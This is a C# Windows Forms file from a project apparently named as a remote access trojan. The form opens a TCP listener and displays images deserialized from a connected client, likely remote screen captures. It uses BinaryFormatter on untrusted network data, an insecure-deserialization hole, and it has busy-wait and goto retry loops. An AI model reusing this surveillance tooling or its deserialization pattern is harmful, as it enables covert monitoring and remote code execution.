using System;
using System.Drawing;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Runtime.Serialization.Formatters.Binary;
namespace LightCosmosRat
{
	/// <summary>
	/// Description of Form2.
	/// </summary>
	public partial class Form2 : Form
	{
        public bool HasConnected;
        private TcpListener imageServer;
        private int serverPort;
		public Thread ServerThread = null;
		public Thread ClientThread = null;
		public Form2()
		{
			//
			// The InitializeComponent() call is required for Windows Forms designer support.
			//
			InitializeComponent();

            //
            // TODO: Add constructor code after the InitializeComponent() call.
            //
            serverPort = 0; //invalid value
			CheckForIllegalCrossThreadCalls = false;
            HasConnected = false;
		}
		void ConnectionHandler(Object myClient){
			TcpClient Client = (TcpClient)myClient;
			NetworkStream myStream = Client.GetStream();
			BinaryFormatter bf = new BinaryFormatter();
			while(true){
			PINTING:
				try{
				pictureBox1.Image = (Image) bf.Deserialize(myStream);
				}catch(Exception e){
					//MessageBox.Show(e.Message);
					goto PINTING;
				}
			}
			
		}
		void ServerHandler(Object myServer){
			TcpListener Server = (TcpListener)myServer;
            TcpClient myClient = null;
			Server.Start();
            while (true)
            {
                try
                {
                    myClient = Server.AcceptTcpClient();
                }catch(Exception Error)
                {
                    return;
                }
                ClientThread = new Thread(ConnectionHandler);
                ClientThread.Start(myClient);
                while (ClientThread.IsAlive)
                {

                }
            }
		}
		void Button1Click(object sender, EventArgs e)
        { 
			try{
                serverPort = int.Parse(textBox1.Text);
			}catch(FormatException fe){
				//MessageBox.Show("Insert a valid port value","Port Error",MessageBoxButtons.OK,MessageBoxIcon.Error);
				return;
			}
			
			try{
				imageServer = new TcpListener(IPAddress.Any,serverPort);
			}catch(Exception ex){
				//MessageBox.Show(ex.Message);
				return;
			}
			button1.Enabled = false;
			ServerThread = new Thread(ServerHandler);
			ServerThread.Start(imageServer);
		}
		void Form2FormClosing(object sender, FormClosingEventArgs e)
		{

            try
            {
                imageServer.Stop();
            }catch(Exception al)
            {
               //MessageBox.Show(al.Message);
            }
            try
            {
                ClientThread.Abort();
                ServerThread.Abort();
            }catch(Exception msg)
            {
                //MessageBox.Show(msg.Message);
            }
		}

        private void Form2_Load(object sender, EventArgs e)
        {

        }
    }
}